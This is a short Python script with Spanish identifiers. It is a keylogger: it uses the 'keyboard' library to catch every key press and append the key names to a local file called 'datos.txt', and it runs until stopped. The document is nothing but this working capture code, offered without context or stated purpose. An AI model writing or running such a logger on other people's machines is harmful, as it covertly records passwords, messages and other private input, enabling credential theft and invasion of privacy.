import keyboard   

def presionar_tecla(tecla):
    with open('datos.txt', 'a') as archivo:
        if tecla.name == 'space':
            archivo.write(' ')
        else:
            archivo.write(tecla.name)

keyboard.on_press(presionar_tecla)
keyboard.wait()
